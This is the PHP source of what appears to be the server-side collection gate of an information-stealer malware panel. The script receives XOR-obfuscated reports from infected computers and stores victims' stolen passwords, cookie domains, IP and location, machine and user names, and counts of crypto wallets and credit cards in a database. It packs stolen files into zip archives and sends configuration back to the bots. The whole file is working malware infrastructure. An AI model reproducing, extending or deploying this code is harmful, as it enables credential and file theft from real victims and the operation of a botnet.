<?php
@error_reporting(0);
@set_time_limit(0);
@ini_set('max_execution_time', 0);
@ini_set('max_input_vars', 100000000);
@ini_set('post_max_size', 0);
@ini_set("memory_limit","500M");
header('Content-Type: application/octet-stream');
/*
function rc4($key, $str) {
	$s = array();
	for ($i = 0; $i < 256; $i++) {
		$s[$i] = $i;
	}
	$j = 0;
	for ($i = 0; $i < 256; $i++) {
		$j = ($j + $s[$i] + ord($key[$i % strlen($key)])) % 256;
		$x = $s[$i];
		$s[$i] = $s[$j];
		$s[$j] = $x;
	}
	$i = 0;
	$j = 0;
	$res = '';
	for ($y = 0; $y < strlen($str); $y++) {
		$i = ($i + 1) % 256;
		$j = ($j + $s[$i]) % 256;
		$x = $s[$i];
		$s[$i] = $s[$j];
		$s[$j] = $x;
		$res .= $str[$y] ^ chr($s[($s[$i] + $s[$j]) % 256]);
	}
	return $res;
};

function CB_XOR($key, $data){
	$result="";
	$keylen=strlen($key);
	$j=0;
	for($i=0;$i<strlen($data); $i++){
		$result .= chr(ord($data[$i])^ord($key[$j]));
		$j++;
		if($j>($keylen-1)) $j=0;
	}
	return $result;
}
*/

function CB_XOR($key, &$data){
	$keylen=strlen($key);
	$j=0;
	for($i=0;$i<strlen($data); $i++){
		$data[$i]= chr(ord($data[$i])^ord($key[$j]));
		$j++;
		if($j>($keylen-1)) $j=0;
	}
}

function CB_XORm($data, $key, $max){
	$datalen=strlen($data);
	$keylen=strlen($key);
	if ($datalen>=$max) $datalen=$max;
	$j=0;
	for($i=0;$i<$datalen; $i++){
		$data[$i] = chr(ord($data[$i])^ord($key[$j]));
		$j++;
		if($j>($keylen-1)) $j=0;
	}
	return $data;
}

function RandomKey($len){
	$data='';
	for($i=0; $i<$len; $i++)
		$data .= chr(rand(1, 253));
	return $data;
};

function CB_ENC($data){
	$l=0;
	$k='';
	$l=rand(1, 253);
	$k=RandomKey($l);
	$result='';
	$result.=chr($l).$k.CB_XOR($k, $data);
	return $result;
};

function CB_DEC($data){
	$l=ord($data[0]);
	$k=substr($data, 1,$l);
	$data=substr($data, $l+1);
	return CB_XOR($k, $data);

};



function GetWork($mid){
	include "config.php";
	include "functions.php";
	$link = mysql_connect($database_host, $database_user, $database_pass) or die('No connect: ' . mysql_error());
	mysql_select_db($database_name) or die('No database');
	mysql_set_charset( 'utf8' );
	$query = sprintf("SELECT COUNT(*) FROM reports WHERE reports.m_id='%s'", 
					mysql_escape_string($mid));
	$res = mysql_query($query) or die('Query error: ' . mysql_error());

	$row = mysql_fetch_row($res);
	$count = $row[0];
	$repeated_reports = true;
	if (pars(FileToString("./cfg.txt"), "IS_G_DOUBLE: ", "\r\n")=="0") 
		$repeated_reports = false;
	$res = true;
	if(($repeated_reports == false) and ($count>0)) 
		$res=false;
	$ret = "exit";
	if($res==true)
		$ret = 	FileToString("./cfg.txt");
	return $ret;
};




function ParseReport($data){
	include "functions.php";
	include "config.php";
	//include_once("modules/tabgeo_country_v4/tabgeo_country_v4.php");
	include_once("modules/sxgeo/SxGeo.php");
	$unical_guid = "AA6EEE0A-97B7-46FE-BD01-0FC54FD36163-ED03A8DD-6213-4535-8891-5D0A112A3F40";
	$info = (pars($data, "<info$unical_guid>", "</info$unical_guid>"));
	$pwds = (pars($data, "<pwds$unical_guid>", "</pwds$unical_guid>"));
	$coks = (pars($data, "<coks$unical_guid>", "</coks$unical_guid>"));
	$file = (pars($data, "<file$unical_guid>", "</file$unical_guid>"));
	$list = (pars($data, "<list$unical_guid>", "</list$unical_guid>"));
	$data="";
	$IP = $_SERVER['REMOTE_ADDR'];
	if (strlen($_SERVER['HTTP_REFERER'])>0)
		$IP = $_SERVER['HTTP_REFERER'];
	
	if (strlen($_SERVER['HTTP_X_FORWARDED_FOR'])>0)
		$IP = $_SERVER['HTTP_X_FORWARDED_FOR'];

	$info = explode('|', $info);
	$link = mysql_connect($database_host, $database_user, $database_pass) or die('No connect: ' . mysql_error());
	mysql_select_db($database_name) or die('No database');
	mysql_set_charset( 'utf8' );
	$filename = date("Y-m-d H-i-s").urldecode($info[0]).".zip"; 
	$SxGeo = new SxGeo('modules/sxgeo/SxGeo.dat');
	$isocode = $SxGeo->get($IP);
	
	//$isocode =  tabgeo_country_v4($IP);
	if (@$isocode == "") $isocode = "AA";
	$query = sprintf("INSERT INTO reports (m_id,ip,country,date,time,compname,username,os_name,os_arch,os_ver,files_count, btc_count, cc_count,passwords_count,bin_type,bin_rights,filename) VALUES ('%s','%s','%s','%s','%s','%s','%s','%s','%s','%s','%s','%s','%s','%s','%s','%s','%s')", 
					mysql_escape_string(urldecode($info[0])),
					mysql_escape_string($IP),
					mysql_escape_string($isocode),
					mysql_escape_string(date("Y-m-d")),
					mysql_escape_string(date("H:i:s")),
					mysql_escape_string(iconv("cp1251", "utf-8", urldecode($info[4]))), 
					mysql_escape_string(iconv("cp1251", "utf-8", urldecode($info[5]))),   //user
					mysql_escape_string(iconv("cp1251", "utf-8", urldecode($info[2]))),
					mysql_escape_string(urldecode($info[3])),
					mysql_escape_string(urldecode($info[1])),
					
					mysql_escape_string(urldecode($info[9])),
					mysql_escape_string(urldecode($info[7])),
					mysql_escape_string(urldecode($info[8])),
					mysql_escape_string(urldecode($info[6])),
					
					mysql_escape_string(urldecode($info[10])),
					mysql_escape_string(urldecode($info[11])),
					mysql_escape_string($filename));
	
	$res = mysql_query($query) or die('Query error: ' . mysql_error());
	$r_id= mysql_insert_id();
	
	$pwdlist = explode("\r\n", $pwds);
		foreach ($pwdlist as &$value) {
		$line = explode("|",$value);
		$soft_type	= mysql_real_escape_string(urldecode(@$line[0]));
		$soft_name	= mysql_real_escape_string(urldecode(@$line[1]));
		$p1 		= mysql_real_escape_string(urldecode(@$line[2]));
		$p2			= mysql_real_escape_string(urldecode(@$line[3]));
		$p3			= mysql_real_escape_string(urldecode(@$line[4]));
		$p4			= mysql_real_escape_string(urldecode(@$line[5]));
		if(strlen($soft_type)>0)$result = mysql_query("INSERT INTO `passwords` (p_soft_type, p_soft_name,r_id, p_p1, p_p2, p_p3, p_p4) VALUES('$soft_type', '$soft_name','$r_id', '$p1', '$p2', '$p3', '$p4')");
	}
	
	$query = 'INSERT INTO `cookies`(domain, r_id) VALUES ';
	$cookielist = explode("\r\n", $coks);
	foreach ($cookielist as $host) {
		$query .= sprintf("('%s', '$r_id'),", mysql_real_escape_string(urldecode($host)))."\r\n";
		
	}
	$query = substr($query, 0, -3);
	$result = mysql_query($query);
	
	
	/*PARSE FILE*/
	
	$zip = new ZipArchive(); //Создаём объект для работы с ZIP-архивами
	$zip->open("./files/$filename", ZIPARCHIVE::CREATE); //Открываем (создаём) архив archive.zip


	
	$list=explode("\r\n", $list);
	foreach($list as $sfile){
		if(strlen($sfile)<1) Continue;
		$line = explode(" ", $sfile, 2);
		$ranges = $line[0];
		$path = iconv('windows-1251', 'CP866//TRANSLIT//IGNORE', $line[1]);
		$ranges=explode("-",$ranges,2);
		$start_pos=(int)$ranges[0];
		$end_pos=(int)$ranges[1];
		$len = $end_pos-$start_pos+1;
		$zip->addFromString($path,substr($file, $start_pos-1, $len)); 
	};
	$zip->addFromString('IP.txt', $IP." ".$isocode);
	$zip->close();
	
	
	
	/*
	WriteToFile('info.txt', $info);
	WriteToFile('pwds.txt', $pwds);
	WriteToFile('coks.txt', $coks);
	WriteToFile('file.txt', $file);
	*/
	//WriteToFile('file.txt', $file);
};




$fileopen=fopen("./files/index.html", "w");
fwrite($fileopen,"");
fclose($fileopen);
	

$postdata = file_get_contents("php://input");
$postdata = CB_XORm($postdata, "l11", 1024*512);
	if(strncmp("reportdata", $postdata, 10)==0){
			//$fileopen=fopen('postdata.txt', "w");
			//fwrite($fileopen,$postdata);
			//fclose($fileopen);
		ParseReport(substr($postdata,11));
		die();
	}; 


	if(strncmp("getcfg", $postdata, 6)==0){
		$work=GetWork(urldecode(substr($postdata,7)));
		$work=CB_XORm($work, "l11", 1024*512);
		echo $work;
	};
	
	



//echo CB_ENC($postdata);
?>